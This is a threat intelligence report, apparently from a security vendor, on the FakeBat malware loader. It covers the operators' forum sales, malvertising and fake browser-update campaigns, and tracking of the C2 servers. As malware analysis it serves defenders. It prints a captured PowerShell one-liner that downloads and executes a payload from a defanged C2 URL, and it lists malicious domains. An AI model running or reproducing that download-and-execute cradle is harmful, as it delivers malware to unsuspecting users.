<h2 class="wp-block-heading" id="h-context">Context</h2>



<p>Over the past few years, cybercriminals have<strong> increasingly used the drive-by download technique to distribute malware via user web browsing</strong>. This technique mostly involves SEO-poisoning, malvertising, and code injection into compromised websites to trick users into <strong>downloading fake software installers or browser updates</strong>.</p>



<p>The drive-by download technique is commonly used by multiple intrusion sets to distribute loaders (<em>e.g.</em> FakeBat, BatLoader), botnets (<em>e.g.</em> IcedID, <a href="https://blog.sekoia.io/pikabot-a-guide-to-its-deep-secrets-and-operations/" target="_blank" rel="noreferrer noopener">PikaBot</a>), infostealers (<em>e.g.</em> Vidar, Lumma, Redline), post-exploitation frameworks (<em>e.g.</em> <a href="https://blog.sekoia.io/hunting-and-detecting-cobalt-strike/" target="_blank" rel="noreferrer noopener">CobaltStrike</a>, Sliver) and RATs (<em>e.g.</em> NetSupport), to name but a few. From our observations, some of these attacks were conducted by Initial Access Brokers (IABs) and have led to the deployment of ransomware (BlackCat, Royal).</p>



<p>During the first semester of 2024, <strong>FakeBat </strong>(aka EugenLoader, PaykLoader) was <strong>one of the most widespread loaders using the drive-by download technique</strong>. FakeBat primarily aims to download and execute the next-stage payload, such as IcedID, Lumma, Redline, SmokeLoader, SectopRAT and Ursnif.</p>



<p>In 2024, Sekoia Threat Detection &amp; Research (TDR) team discovered multiple FakeBat distribution campaigns. These campaigns typically leverage landing pages impersonating legitimate software and are spread via malvertising, fake web browser updates on compromised websites, and social engineering schemes on social networks. Additionally, TDR closely monitored the FakeBat C2 infrastructure to identify new C2 servers and changes in FakeBat communications.</p>



<p>This FLINT aims to <strong>present the activities of the FakeBat operators</strong> on cybercrime forums, an<strong> analysis of previously undocumented campaigns</strong> distributing FakeBat, <strong>technical details on its distribution campaigns and related C2 infrastructures</strong>. Additionally, TDR analysts share Indicators of Compromise (IoCs), YARA rules and tracking heuristics to monitor the FakeBat distribution and C2 infrastructures.</p>



<h2 class="wp-block-heading" id="h-interactions-on-cybercrime-forums">Interactions on cybercrime forums</h2>



<h3 class="wp-block-heading" id="h-fakebat-loader">FakeBat loader</h3>



<h4 class="wp-block-heading" id="h-emergence-of-fakebat">Emergence of FakeBat</h4>



<p>Since at least December 2022, the threat actor <em>Eugenfest</em> (aka <em>Payk_34</em>)<em> </em>has sold FakeBat as Loader-as-a-Service on the Exploit forum.</p>



<p>As advertised by its representative FakeBat is a<strong> loader malware in MSI format</strong> that offers “several anti-detection features, such as bypassing the Unwanted Software Policy of Google and Windows Defender alerts and being protected from VirusTotal”.</p>



<p>By purchasing this service, FakeBat customers have access to an administration panel that allows them to:</p>



<ul class="wp-block-list">
<li>generate FakeBat builds;</li>



<li>manage the distributed payloads;</li>



<li>monitor the installations related to the payload distribution.</li>
</ul>



<p>Notably, the Malware-as-a-Service (MaaS) provides build templates to trojanise legitimate software, thus luring potential victims into executing FakeBat.</p>



<p>The FakeBat administration panel contains information related to the infected host, including the IP address, country, OS, web browser, mimicked software, and installation status. Customers can also write comments for each bot.</p>



<h4 class="wp-block-heading" id="h-second-wave-of-advertising">Second wave of advertising</h4>



<p>In September 2023, FakeBat operators launched a new advertising campaign on cybercrime forums and Telegram channels,<strong> introducing MSIX as a new format for their malware builds</strong>. Moreover, to bypass Microsoft SmartScreen security features, they added a digital signature to the FakeBat installer with a valid certificate. The signature is included in the MSIX format and is available as an extra in the MSI format.</p>



<figure class="wp-block-image"><img decoding="async" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" alt="FakeBat (aka Payk Loader) advertisement on the XSS forum, published by Payk_34 on 2 September 2023" data-lazy-src="https://lh7-eu.googleusercontent.com/docsz/AD_4nXdiEsOJpsSCHXTEjxtADGg9akrpLMlCeFxzu2Sjji-prb0Fu2syX1392CPW-45GfsZhlTdUfrHLfppbFQtIVR1mThIW7pjI16p3YXxkt_2ngUMIaeepbd8RB88hL_UBHFk_5pWTUomagW51a8Z6DQyhgNZb?key=ZNnosQF9f1eRZ_KT1Fiksg"/><noscript><img decoding="async" src="https://lh7-eu.googleusercontent.com/docsz/AD_4nXdiEsOJpsSCHXTEjxtADGg9akrpLMlCeFxzu2Sjji-prb0Fu2syX1392CPW-45GfsZhlTdUfrHLfppbFQtIVR1mThIW7pjI16p3YXxkt_2ngUMIaeepbd8RB88hL_UBHFk_5pWTUomagW51a8Z6DQyhgNZb?key=ZNnosQF9f1eRZ_KT1Fiksg" alt="FakeBat (aka Payk Loader) advertisement on the XSS forum, published by Payk_34 on 2 September 2023"/></noscript><figcaption class="wp-element-caption"><em>Figure 1. FakeBat (aka Payk Loader) advertisement on the XSS forum, published by Payk_34 on 2 September 2023</em></figcaption></figure>



<p>It is noteworthy that the threat actor started using the new handle <em>Payk_34</em> on the XSS forum and Telegram.<em> Payk_34</em> is allegedly the administrator of the “Payk Loader”, for which it possibly provides support through the Telegram account <em>spektr</em>.</p>



<p>In September 2023, FakeBat was sold for $1,000 per week and $2,500 per month for the MSI format, $1,500 per week and $4,000 per month for the MSIX format, and $1,800 per week and $5,000 per month for the MSI + Signature package.</p>



<p>According to the operators’ publication on the associated Telegram channel, the MaaS has a limited number of customers:</p>



<figure class="wp-block-table"><table><tbody><tr><td>MSI &#8211; not available yet due to ongoing issues with Windows Defender.<br><br>There are still seats available on MSIX, but at this rate, they will soon run out.</td></tr></tbody></table><figcaption class="wp-element-caption"><em>(translated from Russian) Payk_34’s publication indicating a “seat” number restriction related to its MaaS program, on 12 October 2023</em></figcaption></figure>



<p>Such a limitation is common for MaaS offerings, particularly for loaders, crypters or botnets, since malware operators aim to control distribution. Restricting the number of customers helps them manage support more effectively, limit the spread of the malware, and reduce the likelihood of detection by antivirus solutions.</p>



<h3 class="wp-block-heading" id="h-associated-distribution-service">Associated distribution service</h3>



<p>In addition to the FakeBat MaaS, in September 2023, <strong><em>Payk_34 </em></strong><strong>advertised an additional distribution service</strong>, centred around FakeBat and landing pages:</p>



<figure class="wp-block-table"><table><tbody><tr><td>We also offer an additional service for the project implementation, it includes:<br>&#8211; Checking for all possible alerts.<br>&#8211; Managing integrations for the landing pages.<br>&#8211; Monitoring loader builds and updating them when alerts appear.<br>&#8211; Handling delivery.<br>&#8211; Managing almost everything related to the delivery.<br><br>The service is negotiated individually with each client.<br>Cost: from $3000, excluding the loader itself. Pricing depends on the complexity of the project.</td></tr></tbody></table><figcaption class="wp-element-caption"><em>(translated from Russian) Payk_34’s publication advertising the distribution servic</em>e</figcaption></figure>



<p>The provided service is comparable to a <strong>personalised Pay-Per-Install (PPI)</strong>, as the FakeBat operators monetise the installation of malicious software by delivering it on behalf of their customers.</p>



<h2 class="wp-block-heading" id="h-different-clusters-distributing-fakebat">Different clusters distributing FakeBat</h2>



<p>Sekoia analysts identified several infection chains distributing FakeBat, likely corresponding to different MaaS customers. The analysis detailed in this section covers three distribution clusters: <strong>malvertising and software impersonation</strong>, <strong>fake web browser updates</strong>, and <strong>social engineering schemes on social networks</strong>.</p>



<h3 class="wp-block-heading" id="h-malvertising-and-software-impersonation">Malvertising and software impersonation</h3>



<p>Since January 2024, TDR has monitored numerous <strong>FakeBat malvertising campaigns leveraging malicious websites that impersonate popular software</strong>. Attackers use trusted advertising services, such as Google Ads, to display these malicious websites at the top of search engine results when users search for software to download.</p>



<p>The malicious websites, also known as landing pages, are often copies of the official software homepages or download pages. They are typically hosted on typosquatting domain names. We observed FakeBat malvertising campaigns targeting the following software:</p>



<figure class="wp-block-table"><table><tbody><tr><td>1Password<br>Advanced SystemCare<br>AnyDesk<br>Bandicam<br>Blender<br>Braavos<br>Cisco Webex<br>Epic Games<br>Google Chrome</td><td>Inkscape<br>Microsoft OneNote<br>Microsoft Teams<br>Notion<br>OBS Studio<br>OpenProject<br>Play WGT Golf<br>Python</td><td>Shapr3D<br>Todoist<br>Trading View<br>Trello<br>VMware<br>Webull<br>WinRAR<br>Zoom</td></tr></tbody></table><figcaption class="wp-element-caption"><em>List of software targeted by FakeBat malveritsing campaigns</em></figcaption></figure>



<p>The list of targeted software primarily includes popular organisational applications. By deploying infostealers, RATs or botnets on such targets, attackers can gain access to valuable accounts or systems, facilitating further post-compromise activities.</p>



<p>The download button on these malicious websites redirects the user to “<em>/download/dwnl.php</em>”, which subsequently downloads from another domain a signed MSIX file corresponding to FakeBat.</p>



<p>Here is an example of a FakeBat infection chain leveraging malvertising, observed by TDR on 30 May 2024:</p>



<ol class="wp-block-list">
<li>The website “<em>hxxps://amydlesk[.]com/”</em> displays a copy of the remote desktop software AnyDesk home page.</li>



<li>The download button redirects to “<em>hxxps://amydlesk[.]com/download/dwnl.php</em>”.</li>



<li>It downloads FakeBat from “<em>hxxps://monkeybeta[.]com/build/AnyDesk-x86.msix</em>” (MD5: <em>4f2e138b6891395a408368a9a5998304</em>).</li>



<li>By executing the MSIX file, it executes the PowerShell script “<em>iiu.ps1</em>” which communicates with the FakeBat C2 server “<em>hxxps://utr-jopass[.]com/buy/</em>” and downloads the next-stage payload.</li>

<h3 class="wp-block-heading" id="h-fake-web-browser-updates">Fake web browser updates</h3>



<p>By pivoting on the endpoint URL “<em>/download/dwnl.php</em>”, Sekoia analysts uncovered a large infrastructure of several hundreds of <strong>compromised websites distributing FakeBat through fake web browser updates</strong>.</p>



<p>These compromised websites are WordPress sites injected with malicious HTML and JavaScript designed to mislead users into thinking they need to update their Chrome browser due to a detected exploit. Clicking on the “Update” button redirects the user to download FakeBat. Additionally, users cannot interact with original WordPress sites due to the injected code prompting on the web browser update popup, encouraging them to download the fake update.</p>



<p>The main capabilities of the code injected into the compromised HTML page include:</p>



<ul class="wp-block-list">
<li>Creating a mask by setting the “<em>aria-hidden</em>” state to <em>true</em>, overlaying the rest of the original webpage, and focusing user attention on the fake web browser update popup. This is done in the HTML class “<em>hustle-popup-mask hustle-optin-mask</em>”.</li>
</ul>



<ul class="wp-block-list">
<li>Including the JavaScript library jQuery with a comment written in Russian “<em>Подключение jQuery</em>” (translated as <em>Connection jQuery</em>), in the HTML class “<em>hustle-group-content</em>”.</li>
</ul>



<ul class="wp-block-list">
<li>Creating an HTML container positioned in the top-right corner of the webpage, in the HTML class “<em>ad</em>”.</li>
</ul>



<ul class="wp-block-list">
<li>Displaying the message “<em>Warning Exploit Chrome Detect</em>”, the Chrome browser logo, and the instruction “<em>Update Chrome Browser</em>”, in the HTML classes “<em>top</em>” and <em>“content</em>”.</li>
</ul>



<ul class="wp-block-list">
<li>Embedding JavaScript that redirects to the FakeBat download when the button is clicked, in the HTML class “<em>bottom</em>”.</li>
</ul>



<p>An example of the injected code is available in the following Gist:<br><a href="https://gist.github.com/qbourgue/e87d897c4f2f14bf715f432c2a2c1f28">https://gist.github.com/qbourgue/e87d897c4f2f14bf715f432c2a2c1f28</a>.&nbsp;</p>

<h3 class="wp-block-heading" id="h-social-engineering-schemes-on-social-networks">Social engineering schemes on social networks</h3>



<p>On 15 May 2024, we uncovered a <strong>campaign targeting the web3 community</strong> that distributed <strong>FakeBat disguised as a fake web3 chat application</strong> called <em>getmess[.]io</em><sup data-fn="298f47ee-0579-43ae-91af-ecd3d7c6bd0a" class="fn"><a id="298f47ee-0579-43ae-91af-ecd3d7c6bd0a-link" href="#298f47ee-0579-43ae-91af-ecd3d7c6bd0a">2</a></sup>.</p>



<p>For this campaign, attackers used a dedicated website, verified social media profiles, and promotional videos, all of which appeared legitimate. We assess with high confidence that cybercriminals mimicked the legitimate chat solution <em>beoble</em> to create the brand new identity <em>getmess</em> to spread the FakeBat malware<sup data-fn="b7328eac-dcd2-4ead-9c5f-949df5bb9161" class="fn"><a id="b7328eac-dcd2-4ead-9c5f-949df5bb9161-link" href="#b7328eac-dcd2-4ead-9c5f-949df5bb9161">3</a></sup>.</p>

<p>It is interesting to note that only users invited to join <em>GetMess</em> were able to download the payload, as access to the download URL required an invitation code. TDR analysts believe this technique increases the trustworthiness to the fake application and helps to hide the final payload from bots and bypass the scrutiny of cybersecurity researchers.</p>



<p>To spread the malicious website and share invitation codes, attackers used allegedly compromised social networks accounts. We identified profiles on X (formerly Twitter) and Telegram promoting it within web3 communities. It is highly likely that some Discord users were also targeted by this FakeBat campaign.</p>



<p>This social engineering phishing campaign employs techniques never seen before in association with FakeBat. We believe that attackers targeted the web3 community to steal data from most valuable accounts, such as those related to cryptocurrency wallets or NFTs owners.</p>



<h2 class="wp-block-heading" id="h-tracking-adversaries-infrastructure">Tracking adversaries infrastructure</h2>



<h3 class="wp-block-heading" id="h-fakebat-c2-servers">FakeBat C2 servers</h3>



<p>The fake software installers are MSIX packages containing directories and files, including a malicious PowerShell script. In the June 2024 version of FakeBat, the initial PowerShell script is straightforward, downloading and executing the next-stage payload from its C2 server:</p>



<pre class="wp-block-code"><code>&amp;{$zqpl='hxxps://utr-krubz&#91;.]com/buy/';$zqplii='lkmns32Sf3lkn';$iiii=(iwr -Uri $zqpl -UserAgent $zqplii -UseBasicParsing).Content; iex $iiii}</code></pre>



<p>In addition to hosting payloads, FakeBat C2 servers highly likely filter traffic based on characteristics such as the User-Agent value, the IP address, and the location. This enables the distribution of the malware to specific targets.</p>



<p>Since December 2023, TDR analysts have been monitoring the FakeBat C2 infrastructure to identify C2 servers and observe changes. The following is an overview of the C2 infrastructure since August 2023.</p>



<h4 class="wp-block-heading" id="h-from-august-to-december-2023">From August to December 2023</h4>

<p>Examples of C2 URLs include:</p>



<p><em>hxxp://clk-info[.]site/?status=install<br>hxxp://clk-info[.]site/?status=start&amp;av=Windows%20Defender</em><br><em>hxxps://3010cars[.]top/?status=start&amp;av=Names&amp;domain=$domain&amp;os=$urlEncodedOsCaption</em></p>

<h2 class="wp-block-heading" id="h-conclusion">Conclusion</h2>



<p>Sold as Malware-as-a-Service (MaaS) to a limited number of customers, FakeBat became one of the most widespread loaders that use the drive-by download technique in 2024. In addition to the standard MaaS package, the FakeBat operators offer a distribution service based on their loader, dedicated landing pages, and possibly search engine advertisements.</p>



<p>In 2024, TDR analysts identified several FakeBat distribution campaigns that leveraged malvertising, software impersonation, fake web browser updates, and social engineering schemes on social networks. We assess with high confidence that the variety of FakeBat distribution clusters is due to its diverse customer base mainly leveraging the malware, and operators distributing FakeBat for their Pay-Per-Install services.</p>



<p>Since August 2023, we unveiled more than 130 domain names associated with high confidence to the FakeBat C2 servers. Monitoring payloads, C2 and distribution infrastructures enables us to identify changes, possibly motivated by efforts to evade detection. Indeed, FakeBat operators almost certainly constantly improve anti-detection and anti-analysis techniques, and rotate their C2 infrastructure, to ensure reliable MaaS services to their customers.</p>



<p>To protect our customers against drive-by download compromises, Sekoia.io analysts will continue to proactively track distribution infrastructures and identify new clusters of landing pages and fake browser updates.</p>
